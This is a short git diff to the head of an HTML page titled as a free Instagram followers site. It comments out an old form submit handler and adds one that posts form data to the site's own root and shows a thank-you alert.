@@ -8,20 +8,39 @@
     <link rel="stylesheet" href="css/media.css">
     <title>4llowersmax | free-instagram-followers </title>
     <script>
-  const handleSubmit = (event) => {
+//   const handleSubmit = (event) => {
+//   event.preventDefault();
+
+//   const myForm = event.target;
+//   const formData = new FormData(myForm);
+
+//   fetch("/", {
+//     method: "POST",
+//     headers: { "Content-Type": "application/x-www-form-urlencoded" },
+//     body: new URLSearchParams(formData).toString(),
+//   })
+//     .then(() => navigate("/thank-you/")) // Assuming navigate is defined
+//     .catch((error) => alert(error));
+// };
+const handleSubmit = (event) => {
   event.preventDefault();
 
   const myForm = event.target;
   const formData = new FormData(myForm);
-
+  
   fetch("/", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: new URLSearchParams(formData).toString(),
   })
-    .then(() => navigate("/thank-you/")) // Assuming navigate is defined
+    .then(() => alert("Thank you for your submission"))
     .catch((error) => alert(error));
 };
+
+document
+  .querySelector("form")
+  .addEventListener("submit", handleSubmit);
+
 
     </script>
 </head>
